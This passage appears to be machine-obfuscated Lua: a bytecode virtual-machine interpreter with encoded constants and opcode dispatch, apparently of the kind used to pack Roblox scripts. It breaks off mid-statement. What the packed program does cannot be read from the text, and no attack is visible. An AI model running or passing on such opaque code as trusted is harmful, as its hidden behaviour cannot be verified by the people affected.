return(function(K2,...)local E,A=({{}}),(...);local i=A[-(4648)];local t=A[-((#{84;}+4606))];local c=A[(5288)];local d=A[-(4530)];local h=A[(5281)];local V3=A[(5264)];local m=A[(5215)];local s=A[-(4509)];local b=A[-(4436)];local h3=A[(5206)];local p3=A[-(4366)];local u3=A[(5164)];local T=A[(5146)];local o=A[(5059)];local e=A[-((#{344;}+4294))];local P=A[(5006)];local V=A[-(4219)];local U=A[(4999)];local G=A[-(4160)];local E=A[-((#{298;183;160;}+4073))];local C=A[(4988)];local w3=A[(4986)];local D=A[(4944)];local F2=A[(4908)];local D2=A[-(4071)];local C2=A[-(4056)];local s3=A[-(3993)];local a3=A[(4890)];local Z3=A[((#{}+4845))];local K3=A[((#{740;720;[127]=376;[324]=567;149;}+4829))];local U3=A[(4819)];local S3=A[(4799)];local O3=A[-(3969)];local t3=A[(4701)];local i3=A[((#{[376]=259;[483]=654;475;875;199;749;}+4630))];local d3=A[(4535)];local c3=A[-(3922)];local f3=A[((#{402;204;}+4481))];local H2=A[((#{[952]=471;519;850;425;[45]=439;715;}+4413))];local G3=A[-(3849)];local g=A[-(3813)];local D3=A[((#{665;}+4344))];local B3=A[-(3810)];local l3=A[-(3743)];local H3=A[-(3707)];local p=A[(4327)];local q=A[(4309)];local z=A[(4260)];local E3=A[(4200)];local A3=A[-((#{}+3617))];local I3=A[(4105)];local v3=A[(4023)];local g3=A[(4015)];local j3=A[-((#{[687]=477;[754]=104;[87]=597;[732]=875;369;[574]=672;9;288;}+3522))];local A2=A[-((#{359;[919]=148;940;[181]=263;690;720;}+3457))];local N2=A[((#{748;870;108;698;}+3945))];local l2=A[((#{}+3891))];local Q3=A[-(3364)];local X3=A[((#{}+3839))];local W3=A[(3825)];local n3=A[-(3338)];local y=A[(3769)];local x3=A[-((#{587;148;276;784;}+3308))];local Y3=A[(3758)];local M3=A[(3701)];local P3=A[((#{}+3669))];local R3=A[((#{607;[469]=420;557;}+3589))];local e3=A[-(3252)];local o3=A[-((#{}+3209))];local T3=A[((#{588;930;314;991;}+3557))];local z3=A[(3555)];local r3=A[-(3131)];local B2=A[(3517)];local E2=A[-((#{}+3104))];local J2=A[(3477)];local V2=A[((#{356;641;[590]=875;860;[734]=294;[202]=956;822;}+3422))];local L2=A[-((#{}+3058))];local G2=A[(3357)];local U2=A[-(2990)];local I2=A[((#{[728]=793;[538]=116;[213]=10;562;654;987;75;}+3337))];local b3=A[(3279)];local k3=A[-(2920)];local m3=A[(3277)];local q3=A[(3275)];local y3=A[(3228)];local N3=A[-(2905)];local r=A[-(2892)];local u=A[-(2851)];local f=A[-(2844)];local x=A[-(2792)];local w=A[-(2764)];local j=A[-((#{840;[626]=444;819;80;}+2675))];local v=A[((#{}+3182))];local Z=A[(3118)];local a=A[(3034)];local k=A[-((#{}+2587))];local K=A[(2972)];local Y=A[((#{}+2952))];local O=A[-((#{}+2576))];local X=A[(2858)];local Q=A[(2809)];local M=A[-((#{559;[211]=231;674;45;271;}+2568))];local W=A[(2745)];local R=A[-(2511)];local S=A[((#{766;}+2704))];local I=A[-((#{525;737;}+2443))];local N=A[(2631)];local L=A[(2563)];local L3=A[-((#{275;948;29;}+2392))];local J3=A[((#{}+2539))];local B=A[-((#{[75]=797;776;}+2393))];local C3=A[-((#{[999]=133;[132]=195;600;892;185;225;}+2301))];local F3=A[-(2274)];local H=A[-(2233)];local J=A[((#{119;}+2495))];local n=((getfenv)or(function(...)return(_ENV);end));local F,l=(""),(n(J));local Y2,Y2=(H^((#{[979]=70;825;537;465;}+29))),(H^(32))-J;local B=((l[""..A[F3]..A[C3].."\116\51\50"])or(l[""..A[B]..A[J3]..A[L3]])or({}));local N=(((B)and(B["\98"..A[L]..A[N]..A[I]]))or(function(A,E)local l,D=J,(0);while((A>S)and(E>S))do local C,B=A%H,E%(2);if C~=B then D=D+l;end;A,E,l=(A-C)/H,(E-B)/H,l*(2);end;if A<E then A=E;end;while A>S do local E=A%H;if E>S then D=D+l;end;A,l=(A-E)/H,l*(2);end;return(D);end));local I=(F[""..A[R]..A[W]..A[M].."\114"]);local X=(F["\98\121"..A[Q]..A[X]]);local W=(F["\115"..A[O]..A[Y]]);local F=(l[""..A[-K]..A[k]..A[-a].."\114\115"]);local F=(l["\109"..A[Z]..A[-v].."\104"][""..A[j]..A[w]..A[x]..A[f]..A[-u]]);local u=(l[""..A[-r]..A[-N3]..A[-y3].."\104"]["\108\100\101\120"..A[q3]]);local F=(l["\114"..A[-m3]..A[-k3].."\115"..A[-b3].."\116"]);local L=((l[""..A[-I2]..A[U2].."\112"..A[-G2].."\99"..A[L2]])or(l[""..A[-V2]..A[-L]..A[J2].."\108\101"][""..A[-E2]..A[-B2].."\112\97"..A[-r3]..A[z3]]));local F=(l[""..A[T3].."\111"..A[o3].."\117"..A[e3]..A[-R3]..A[P3].."\114"]);local Q=(l["\115\101\108\101"..A[M3].."\116"]);local r=(l[""..A[Y3].."\101\116"..A[-x3].."\101\116"..A[-y].."\116\97\98\108\101"]);local K=(B[""..A[n3].."\115\104"..A[W3].."\102\116"]);local K=(B[""..A[-X3].."\110\111\116"]);local K=(B[""..A[-Q3]..A[l2].."\110\100"]);local K=(B["\98\111\114"]);local B=(B["\114"..A[-N2].."\104"..A[-A2]..A[j3]..A[-g3]]);local B=(l["\116"..A[-v3]..A[I3].."\108\101"]["\105\110"..A[-A3].."\101\114"..A[E3]]);local K=(l[""..A[-z].."\97"..A[-q].."\108\101"]["\99"..A[p].."\110"..A[H3].."\97"..A[-l3]]);local B=(l[""..A[B3]..A[D3]..A[g]..A[-G3].."\101"][""..A[-H2]..A[-f3]..A[-c3].."\111\118"..A[d3]]);local M=(((l["\116\97"..A[-i3].."\108\101"][""..A[t3]..A[-O3]..A[-S3]..A[-U3].."\116"..A[K3]]))or(function(A,...)return({L(({}),J,A)});end));local A=(l["\115"..A[-Z3].."\114"..A[-a3]..A[s3]..A[-C2]][""..A[-D2].."\115"..A[-F2].."\98"]);local B=(D);local l,a=({}),({});for A=S,B-(1)do local E=I(A);l[A]=E;a[A]=E;a[E]=A;end;local function Y(C)local E,H,D=(""),(""),({});local A=J;local function L()local E=F(W(C,A,A),w3);A=A+J;local H=F(W(C,A,A+E-J),((#{}+36)));A=A+E;return(H);end;E=I(L());D[J]=E;while(A<#C)do local A=L();if l[A]then H=l[A];else H=E..W(E,J,((#{729;687;802;}-2)));end;l[B]=E..W(H,J,(1));D[#D+J],E,B=H,H,B+J;end;return(K(D));end;local l,A=(Y(K2)),(J);local function R()local C,B,l,H=X(l,A,A+C);C=N(C,E);B=N(B,E);l=N(l,E);H=N(H,E);A=A+G;return((H*U)+(l*V)+(B*D)+C);end;local function Z()local E=N(X(l,A,A),E);A=(A+J);return(E);end;local function I()local B,l=X(l,A,A+H);B=N(B,E);l=N(l,E);A=A+H;return((l*D)+B);end;local function K(E,A,l)if(l)then local A=(E/H^(A-J))%(2)^((l-J)-(A-J)+((#{510;}+0)));return(A-(A%J));else local A=H^(A-J);return(((E%(A+A)>=A)and(J))or((0)));end;end;local x="\35";local function Y(...)return({...}),Q(x,...);end;local function f(...)local L=({});local Q=({});local B=({});local F,Y,O,M=X(l,A,A+C);F=N(F,E);Y=N(Y,E);O=N(O,E);M=N(M,E);A=A+G;local F=((M*U)+(O*V)+(Y*D)+F);for F=S,F-J,(1)do local B=N(X(l,A,A),E);A=(A+J);local B=(B);local B=B;if(K(B,J,((#{771;[141]=323;760;284;}-2)))==S)then local B=K(B,H,(3));if(B==C)then local K,J,C,B=X(l,A,A+C);K=N(K,E);J=N(J,E);C=N(C,E);B=N(B,E);A=A+G;local B=((B*U)+(C*V)+(J*D)+K);local J=(B)-(H^((#{663;504;}+14)));local B,C=X(l,A,A+H);B=N(B,E);C=N(C,E);A=A+H;local B=((C*D)+B);local C=(B);local l,B=X(l,A,A+H);l=N(l,E);B=N(B,E);A=A+H;local A=((B*D)+l);local E=(A);local A=(I());L[F]=({[P]=C;[e]=E;[o]=A;[T]=J;});elseif(B==S)then local J=(I());local I=(I());local C,B=X(l,A,A+H);C=N(C,E);B=N(B,E);A=A+H;local B=((B*D)+C);local C=(B);local B,l=X(l,A,A+H);B=N(B,E);l=N(l,E);A=A+H;local A=((l*D)+B);local A=(A);L[F]=({[T]=J;[P]=I;[o]=A;[e]=C;});elseif(B==J)then local C,B,H,l=X(l,A,A+C);C=N(C,E);B=N(B,E);H=N(H,E);l=N(l,E);A=A+G;local A=((l*U)+(H*V)+(B*D)+C);local A=(A);local E=(I());local H=(I());L[F]=({[o]=H;[T]=A;[e]=(nil);[P]=E;});elseif(B==H)then local B,C,J,K=X(l,A,A+C);B=N(B,E);C=N(C,E);J=N(J,E);K=N(K,E);A=A+G;local B=((K*U)+(J*V)+(C*D)+B);local C=(B)-(H^(16));local l,B=X(l,A,A+H);l=N(l,E);B=N(B,E);A=A+H;local A=((B*D)+l);local E=(A);local A=(I());L[F]=({[T]=C;[P]=E;[o]=A;[e]=(nil);});end;end;end;for F=S,R()-J,((#{805;699;421;440;}-3))do local L=I();if(L==u3)then local A=Z();B[F]=(A~=S);elseif(L==p3)then while(true)do local Y=R();local L,l,I,C=X(l,A,A+C);L=N(L,E);l=N(l,E);I=N(I,E);C=N(C,E);A=A+G;local A=((C*U)+(I*V)+(l*D)+L);local E=A;local D=J;local l=(K(E,J,((#{314;533;494;321;}+16)))*(H^(32)))+Y;local A=K(E,h3,(31));local E=((-J)^K(E,b));if(A==S)then if(l==S)then B[F]=(E*S);break;else A=J;D=S;end;elseif(A==s)then B[F]=(l==S)and(E*(J/(0)))or(E*(S/((#{99;541;}-2))));break;end;B[F]=u(E,A-m)*(D+(l/(H^((#{187;}+51)))));break;end;elseif(L==V3)then while(true)do local H=('');local D=R();if(D==S)then B[F]=H;break;end;local l=W(l,A,A+D-J);A=A+D;for A=J,#(l),J do H=H..a[N(X(W(l,A,A)),E)];end;B[F]=H;break;end;else B[F]=(nil);end;end;local I=Z();local F,C,l,H=X(l,A,A+C);F=N(F,E);C=N(C,E);l=N(l,E);H=N(H,E);A=A+G;local A=((H*U)+(l*V)+(C*D)+F);for A=S,A-J,(1)do Q[A]=f();end;return({[h]=((#{382;}-1));[d]=Q;[c]=I;[t]=L;[i]=B;});end;local function R(A,O,I,...)local G=A[c];local B=A[i];local l=A[t];local c=A[h];local Z=A[d];return(function(...)local V=-(J);local E={};local K={...};local U=Q(x,...)-J;local Q={};local H={};local D=o;local C=T;local F=e;local P=P;for A=S,U,J do if(A>=G)then E[A-G]=K[A+J];else H[A]=K[A+J];end;end;local A=U-G+J local A=c;local E,J=(nil),(nil);while(true)do E=l[A];J=E[P];if(J<=92)then if(J<=45)then if(J<=22)then if(J<=10)then if(J<=4)then if(J<=1)then if(J==0)then local B=E[D];local l={};for A=1,#Q,1 do local A=Q[A];for E=0,#A,1 do local A=A[E];local D=A[1];local E=A[2];if((D==H)and(E>=B))then l[E]=D[E];A[1]=l;end;end;end;elseif(J<=1)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[79]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[8]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];H[E[D]]=H[5]+H[E[F]];A=A+1;E=l[A];H[E[D]]=H[E[C]]*H[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[55]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[26]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[74]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[33]];A=A+1;E=l[A];H[E[D]]=H[7]+H[E[F]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[8]];A=A+1;E=l[A];H[9]=H[E[C]][B[16]];A=A+1;E=l[A];H[8]=H[E[C]]+H[E[F]];A=A+1;E=l[A];H[E[D]]=H[8]*B[11];A=A+1;E=l[A];H[9]=B[51];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[6][B[38]];A=A+1;E=l[A];H[E[D]]=H[E[C]]*H[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[6]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[6]=H[E[C]][B[38]];A=A+1;E=l[A];H[E[D]]=H[E[C]]-H[E[F]];A=A+1;E=l[A];H[E[D]]=H[4]+H[5];A=A+1;E=l[A];H[E[D]]=H[E[C]]*B[71];A=A+1;E=l[A];H[2][B[E[C]]]=H[E[F]];end;elseif(J<=2)then A=A+1;E=l[A];H[7]=B[8];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[5][B[20]];A=A+1;E=l[A];H[E[D]]=H[5][B[29]];A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local F=E[D];H[F](L(H,F+1,E[C]));A=A+1;E=l[A];H[E[D]]=I[B[6]];A=A+1;E=l[A];H[5]();elseif(J>3)then A=A+1;E=l[A];H[E[D]]=O[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[10]];A=A+1;E=l[A];H[3]=B[E[C]];A=A+1;E=l[A];local D=E[D];H[D]=H[D](L(H,D+1,E[C]));A=A+1;E=l[A];H[0][B[11]]=H[E[F]];elseif(J<4)then local A=E[D];local l,E=Y(H[A](L(H,A+1,E[C])));V=E+A-1;local E=0;for A=A,V do E=E+1;H[A]=l[E];end;end;elseif(J<=7)then if(J<=5)then A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[11]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[8][B[49]];A=A+1;E=l[A];H[E[D]]=H[8][B[E[F]]];A=A+1;E=l[A];local J=E[D];local F=H[8];H[J+1]=F;H[J]=F[B[57]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J>6)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[0]];A=A+1;E=l[A];do return(H[0]);end;elseif(J<7)then H[E[D]]();end;elseif(J<=8)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];I[B[2]]=H[E[D]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[2]=I[B[E[C]]];A=A+1;E=l[A];local I=E[D];local J=H[2];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[4]=B[17];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[27]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;elseif(J>9)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];do return(H[0]);end;elseif(J<10)then O[E[C]]=H[E[D]];end;elseif(J<=16)then if(J<=13)then if(J<=11)then A=A+1;E=l[A];local J=E[D];local I=H[11];H[J+1]=I;H[J]=I[B[111]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];elseif(J==12)then H[E[D]]=H[E[C]]/B[E[F]];elseif(J<=13)then A=A+1;E=l[A];H[E[D]]=H[13][B[E[F]]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[76]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](H[J+1]);A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local F,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=F[C];end;A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,V));end;elseif(J<=14)then I[B[E[C]]]=H[E[D]];elseif(J>15)then A=A+1;E=l[A];H[E[D]]=I[B[25]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[15]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[14]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[7]];A=A+1;E=l[A];H[E[D]]=H[1][B[28]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;elseif(J<16)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[0]=I[B[3]];A=A+1;E=l[A];H[E[D]]=H[0][B[1]];A=A+1;E=l[A];H[E[D]]=R(Z[E[C]],(nil),I);A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];H[E[D]]();end;elseif(J<=19)then if(J<=17)then A=A+1;E=l[A];H[E[D]]=B[12];A=A+1;E=l[A];H[3]=H[E[C]];A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[2]=B;A=A+1;E=l[A];local D=E[D];H[D](H[D+1]);A=A+1;E=l[A];do return;end;elseif(J>18)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[1]=H[E[C]][B[4]];A=A+1;E=l[A];local J=E[D];local F=H[1];H[J+1]=F;H[J]=F[B[18]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local F=E[D];H[F]=H[F](L(H,F+1,E[C]));A=A+1;E=l[A];local F=E[D];local C=H[E[C]];H[F+1]=C;H[F]=C[B[3]];A=A+1;E=l[A];local A=E[D];H[A](H[A+1]);elseif(J<19)then H[E[D]]=H[E[C]];end;elseif(J<=20)then A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[3]];A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[E[F]];A=A+1;E=l[A];H[0]=I[B[15]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,E[C]));elseif(J>21)then if(H[E[D]]<H[E[F]])then A=A+1;else A=E[C];end;elseif(J<22)then A=A+1;E=l[A];H[E[D]]=I[B[80]];A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[287]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local V=H[E[C]];H[J+1]=V;H[J]=V[B[E[F]]];A=A+1;E=l[A];H[4]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=I[B[238]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local C=E[D];H[C](H[C+1]);A=A+1;E=l[A];H[E[D]]=I[B[17]];end;elseif(J<=33)then if(J<=27)then if(J<=24)then if(J==23)then local A=E[D];local l=H[E[C]];H[A+1]=l;H[A]=l[B[E[F]]];elseif(J<=24)then A=A+1;E=l[A];H[E[D]]=I[B[24]];A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[64]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local A=E[D];local D={H[A](L(H,A+1,V));};local l=0;for A=A,E[F]do l=l+1;H[A]=D[l];end;end;elseif(J<=25)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[10]];A=A+1;E=l[A];local J=E[D];local I=H[0];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[5];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[0]=H[E[C]][B[0]];A=A+1;E=l[A];H[E[D]]=H[0][B[7]];A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local A=E[D];H[A](H[A+1]);elseif(J==26)then H[E[D]]=M(E[C]);elseif(J<=27)then A=A+1;E=l[A];H[E[D]]=H[12][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[49];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[67]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[E[F]];A=A+1;E=l[A];H[12][B[56]]=H[E[F]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[E[F]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[E[F]];A=A+1;E=l[A];H[E[D]]=H[11][B[E[F]]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[32]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local C=E[D];H[C]=H[C](H[C+1]);A=A+1;E=l[A];H[E[D]][B[51]]=H[E[F]];end;elseif(J<=30)then if(J<=28)then if(H[E[D]]~=H[E[F]])then A=A+1;else A=E[C];end;elseif(J>29)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[0]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local J=E[D];local C=H[1];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;elseif(J<30)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[2]];A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=I[B[2]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=O[E[C]];A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,E[C]));end;elseif(J<=31)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[5][B[E[F]]];A=A+1;E=l[A];local J=E[D];local F=H[E[C]];H[J+1]=F;H[J]=F[B[33]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==32)then A=A+1;E=l[A];H[1]=I[B[31]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[3]];A=A+1;E=l[A];H[3]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[1]=H[1][B[26]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];H[E[D]]=H[1][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[15]];A=A+1;E=l[A];H[E[D]]=H[1][B[E[F]]];A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];local C=H[1];H[J+1]=C;H[J]=C[B[1]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;elseif(J<=33)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];H[E[D]]=H[0][B[11]];A=A+1;E=l[A];H[0]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=I[B[5]];A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[1][B[E[F]]];A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[1]=H[E[C]]/B[E[F]];A=A+1;E=l[A];H[0]=H[0]+H[E[F]];A=A+1;E=l[A];I[B[E[C]]]=H[E[D]];end;elseif(J<=39)then if(J<=36)then if(J<=34)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[22]];A=A+1;E=l[A];H[7]=H[5][B[E[F]]];A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[11]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==35)then if(B[E[D]]<H[E[F]])then A=A+1;else A=E[C];end;elseif(J<=36)then local A=E[D];H[A](H[A+1]);end;elseif(J<=37)then A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=I[B[5]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J>38)then A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[12];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[43]];A=A+1;E=l[A];H[0]=H[0][B[E[F]]];A=A+1;E=l[A];local V=E[D];local J=H[0];H[V+1]=J;H[V]=J[B[1]];A=A+1;E=l[A];H[2]=B[41];A=A+1;E=l[A];H[3]=M(256);A=A+1;E=l[A];H[3][B[E[C]]]=B[2];A=A+1;E=l[A];H[4]=I[B[E[C]]];A=A+1;E=l[A];H[3][B[E[C]]]=H[E[F]];A=A+1;E=l[A];H[E[D]][B[42]]=B[59];A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,E[C]));elseif(J<39)then A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];local D=E[D];H[D](H[D+1]);A=A+1;E=l[A];do 